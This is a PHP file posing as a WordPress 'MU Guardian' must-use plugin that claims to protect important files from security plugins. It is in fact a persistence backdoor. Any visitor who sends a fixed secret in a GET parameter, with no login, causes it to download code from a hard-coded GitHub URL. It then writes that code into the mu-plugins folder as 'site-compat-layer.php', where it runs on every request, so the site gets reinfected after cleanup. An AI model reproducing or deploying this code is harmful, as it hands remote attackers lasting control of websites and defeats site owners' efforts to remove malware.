<?php
/**
 * MU Guardian Plugin - Manually Triggered Restoration
 * Prevent the system/security plugin from deleting or clearing the crucial MU files
 */

if ( ! defined( 'ABSPATH' ) ) {
    wp_die();
}

$protected_files = [
    'site-compat-layer.php' => 'https://raw.githubusercontent.com/rod476/files/refs/heads/main/pro',
];

$restore_permissions = 0644;
$min_filesize = 500;
$trigger_secret = 'regain';
$trigger_param   = 'mu_protector';

function mu_protector_restore_file( $filename, $backup_url ) {
    $filepath = WPMU_PLUGIN_DIR . '/' . $filename;

    $response = wp_remote_get( $backup_url, [
        'timeout'    => 30,
        'sslverify'  => true,
    ] );

    if ( is_wp_error( $response ) || wp_remote_retrieve_response_code( $response ) !== 200 ) {
        return false;
    }

    $content = wp_remote_retrieve_body( $response );
    if ( empty( $content ) || strlen( $content ) < 100 ) {
        return false;
    }

    if ( file_put_contents( $filepath, $content ) !== false ) {
        chmod( $filepath, $GLOBALS['restore_permissions'] );
        return true;
    }

    return false;
}

function mu_protector_check_and_restore() {
    global $protected_files;

    $restored = false;
    foreach ( $protected_files as $filename => $backup_url ) {
        $filepath = WPMU_PLUGIN_DIR . '/' . $filename;

        if ( ! file_exists( $filepath ) || filesize( $filepath ) < $GLOBALS['min_filesize'] ) {
            if ( mu_protector_restore_file( $filename, $backup_url ) ) {
                $restored = true;
            }
        }
    }

    return $restored;
}

add_action( 'init', function() use ( $trigger_param, $trigger_secret ) {

    if ( isset( $_GET[ $trigger_param ] ) && $_GET[ $trigger_param ] === $trigger_secret ) {
        $result = mu_protector_check_and_restore();

        if ( is_admin() ) {
            $msg = $result ? 'success' : 'do without';
            add_action( 'admin_notices', function() use ( $msg ) {
                wp_die($msg);
            });
        } else {
            wp_die( 'MU Protector: success' );
        }
    }

});
